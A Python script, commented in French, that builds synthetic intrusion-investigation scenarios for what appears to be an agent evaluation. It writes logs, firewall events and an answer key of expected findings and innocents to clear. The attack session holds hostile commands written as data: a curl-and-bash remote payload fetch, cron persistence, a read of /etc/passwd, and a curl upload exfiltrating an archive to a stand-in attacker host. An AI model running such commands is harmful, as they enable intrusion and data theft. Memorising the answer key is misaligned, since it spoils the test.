import ast
import json
import os

# --- Reprise des deux scénarios existants depuis agent_investigation.py ---
src = open("agent_investigation.py", encoding="utf-8").read()
SCENARIOS = None
for node in ast.parse(src).body:
    if isinstance(node, ast.Assign) and getattr(node.targets[0], "id", "") == "SCENARIOS":
        SCENARIOS = ast.literal_eval(node.value)

SCENARIOS["compte"]["verite"] = {
    "faits_attendus": [
        {"fait": "compte backdoor créé", "mots_cles": ["backdoor"]},
        {"fait": "lecture de /etc/shadow", "mots_cles": ["shadow"]},
        {"fait": "IP attaquante 172.18.0.4", "mots_cles": ["172.18.0.4"]},
    ],
    "a_ne_pas_accuser": [],
}
SCENARIOS["telechargement"]["verite"] = {
    "faits_attendus": [
        {"fait": "serveur de l'attaquant 198.51.100.99", "mots_cles": ["198.51.100.99"]},
        {"fait": "transfert de 850 Mo", "mots_cles": ["850"]},
        {"fait": "IP attaquante 203.0.113.50", "mots_cles": ["203.0.113.50"]},
    ],
    "a_ne_pas_accuser": [],
}


# --- Scénario réaliste -----------------------------------------------------
auth, commandes, pare_feu, comptes = [], {}, [], []


def ev(t, ip, user, result, session=None):
    auth.append({"time": t, "ip": ip, "user": user, "result": result, "session": session})


def fw(t, src, dst, port, mb):
    pare_feu.append({"time": t, "src": src, "dst": dst, "port": port, "mb": mb})


# Supervision : connexion toutes les heures (bruit légitime)
for h in range(24):
    sid = f"s-5{h:03d}"
    ev(f"{h:02d}:00:03", "10.0.0.40", "nagios", "Accepted", sid)
    commandes[sid] = ["uptime", "df -h", "exit"]

# Sauvegarde nocturne légitime (gros transfert sortant vers le serveur de sauvegarde)
ev("03:00:02", "10.0.0.30", "backup", "Accepted", "s-3001")
commandes["s-3001"] = ["tar czf - /var/www /etc/nginx", "exit"]
fw("03:00:05", "10.0.0.30", "10.0.0.20", 22, 0)
fw("03:05:20", "10.0.0.20", "10.0.0.30", 22, 1200)

# Administrateur pierre : faute de frappe, maintenance, création légitime d'un compte
ev("08:30:40", "10.0.0.5", "pierre", "Failed")
ev("08:31:02", "10.0.0.5", "pierre", "Accepted", "s-6001")
commandes["s-6001"] = ["systemctl status nginx", "tail -n 50 /var/log/nginx/error.log",
                       "sudo apt update", "sudo apt upgrade -y", "exit"]
fw("08:40:11", "10.0.0.20", "192.0.2.80", 443, 150)       # miroir de mises à jour
ev("10:12:44", "10.0.0.5", "pierre", "Accepted", "s-6002")
commandes["s-6002"] = ["sudo useradd -m stagiaire", "sudo passwd stagiaire", "exit"]
comptes.append({"account": "stagiaire", "created_at": "10:13:20", "by_session": "s-6002"})
ev("16:45:10", "10.0.0.5", "pierre", "Accepted", "s-6003")
commandes["s-6003"] = ["df -h", "exit"]

# Développeuse marie : faute de frappe, déploiement, puis connexion depuis chez elle
ev("09:12:40", "10.0.0.7", "marie", "Failed")
ev("09:12:55", "10.0.0.7", "marie", "Accepted", "s-6101")
commandes["s-6101"] = ["cd /var/www/html", "git pull", "sudo systemctl reload nginx", "exit"]
ev("14:20:31", "10.0.0.7", "marie", "Accepted", "s-6102")
commandes["s-6102"] = ["tail -n 100 /var/log/nginx/access.log", "exit"]
fw("18:05:10", "203.0.113.12", "10.0.0.20", 22, 0)
ev("18:05:12", "203.0.113.12", "marie", "Accepted", "s-6103")
commandes["s-6103"] = ["ls", "exit"]

# Bruit Internet : robots qui testent des comptes, sans jamais réussir
for t, u in [("01:12:09", "root"), ("01:12:11", "admin"), ("01:12:14", "root")]:
    ev(t, "192.0.2.44", u, "Failed")
for t, u in [("05:40:30", "admin"), ("05:40:33", "admin")]:
    ev(t, "198.51.100.7", u, "Failed")
for t, u in [("11:02:01", "oracle"), ("11:02:03", "git"), ("11:02:04", "pi"),
             ("11:02:06", "ftpuser"), ("11:02:08", "test")]:
    ev(t, "192.0.2.150", u, "Failed")
fw("09:00:00", "10.0.0.20", "192.0.2.10", 443, 5)
fw("13:00:00", "10.0.0.20", "192.0.2.10", 443, 4)

# ATTAQUE : brute force lent (un essai toutes les 3 minutes, pour échapper aux
# protections), compte de service "deploy", persistance par cron, exfiltration
for t, u in [("02:31:10", "root"), ("02:34:05", "admin"), ("02:37:41", "ubuntu"),
             ("02:41:02", "deploy"), ("02:44:30", "test"), ("02:48:12", "postgres"),
             ("02:51:47", "deploy")]:
    ev(t, "203.0.113.77", u, "Failed")
fw("02:55:18", "203.0.113.77", "10.0.0.20", 22, 0)
ev("02:55:18", "203.0.113.77", "deploy", "Accepted", "s-4101")
commandes["s-4101"] = [
    "id", "uname -a", "cat /etc/passwd", "crontab -l",
    "curl -s http://198.51.100.99/p.sh -o /tmp/.p.sh",
    "bash /tmp/.p.sh",
    "(crontab -l; echo '*/30 * * * * bash /tmp/.p.sh') | crontab -",
    "exit",
]
fw("02:57:02", "10.0.0.20", "198.51.100.99", 80, 1)
for t in ["03:00:01", "03:30:01", "04:00:01", "04:30:01", "05:00:01", "05:30:01"]:
    fw(t, "10.0.0.20", "198.51.100.99", 8443, 0.1)          # balises de la tâche cron
fw("04:10:05", "203.0.113.77", "10.0.0.20", 22, 0)
ev("04:10:05", "203.0.113.77", "deploy", "Accepted", "s-4102")
commandes["s-4102"] = [
    "tar czf /tmp/d.tgz /var/www/uploads /etc/nginx",
    "curl -T /tmp/d.tgz http://198.51.100.99:8443/up",
    "rm /tmp/d.tgz",
    "exit",
]
fw("04:12:40", "10.0.0.20", "198.51.100.99", 8443, 640)     # exfiltration

auth.sort(key=lambda e: e["time"])
pare_feu.sort(key=lambda e: e["time"])

SCENARIOS["realiste"] = {
    "alerte": "Transfert sortant inhabituel : 640 Mo envoyés à 04:12 par web-prod (10.0.0.20) "
              "vers 198.51.100.99, une adresse externe jamais vue auparavant.",
    "auth": auth,
    "commandes": commandes,
    "pare_feu": pare_feu,
    "comptes": comptes,
    "verite": {
        "faits_attendus": [
            {"fait": "IP de l'attaquant 203.0.113.77", "mots_cles": ["203.0.113.77"]},
            {"fait": "compte deploy compromis (brute force lent)", "mots_cles": ["deploy"]},
            {"fait": "serveur de l'attaquant 198.51.100.99", "mots_cles": ["198.51.100.99"]},
            {"fait": "persistance par tâche cron", "mots_cles": ["cron"]},
            {"fait": "exfiltration d'environ 640 Mo", "mots_cles": ["640"]},
        ],
        "a_ne_pas_accuser": [
            {"element": "10.0.0.30", "mots_cles": ["10.0.0.30"],
             "raison": "sauvegarde nocturne légitime (1200 Mo)"},
            {"element": "compte stagiaire", "mots_cles": ["stagiaire"],
             "raison": "créé légitimement par pierre"},
            {"element": "10.0.0.40 / nagios", "mots_cles": ["10.0.0.40", "nagios"],
             "raison": "supervision horaire"},
            {"element": "203.0.113.12", "mots_cles": ["203.0.113.12"],
             "raison": "connexion légitime de marie depuis chez elle"},
            {"element": "robots Internet", "mots_cles": ["192.0.2.44", "198.51.100.7", "192.0.2.150"],
             "raison": "tentatives échouées, sans succès"},
        ],
    },
}


# --- Écriture : un événement par ligne pour rester lisible -------------------
def ligne(x):
    return json.dumps(x, ensure_ascii=False)


def ecrire(obj, chemin):
    out = ["{"]
    cles = list(obj)
    for i, k in enumerate(cles):
        v = obj[k]
        sep = "," if i < len(cles) - 1 else ""
        if isinstance(v, list) and v and isinstance(v[0], dict):
            out.append(f'  "{k}": [')
            out += [f'    {ligne(e)}{"," if j < len(v) - 1 else ""}' for j, e in enumerate(v)]
            out.append(f"  ]{sep}")
        elif k == "commandes":
            out.append('  "commandes": {')
            items = list(v.items())
            out += [f'    {ligne(a)}: {ligne(b)}{"," if j < len(items) - 1 else ""}'
                    for j, (a, b) in enumerate(items)]
            out.append(f"  }}{sep}")
        elif isinstance(v, dict):
            out.append(f'  "{k}": ' + json.dumps(v, ensure_ascii=False, indent=2).replace("\n", "\n  ") + sep)
        else:
            out.append(f'  "{k}": {ligne(v)}{sep}')
    out.append("}")
    with open(chemin, "w", encoding="utf-8") as f:
        f.write("\n".join(out) + "\n")


os.makedirs("scenarios", exist_ok=True)
for nom, scen in SCENARIOS.items():
    chemin = f"scenarios/{nom}.json"
    ecrire(scen, chemin)
    json.load(open(chemin, encoding="utf-8"))   # contrôle : le JSON est valide
    print(chemin, "OK,", len(scen["auth"]), "événements d'authentification,",
          len(scen["pare_feu"]), "événements pare-feu")
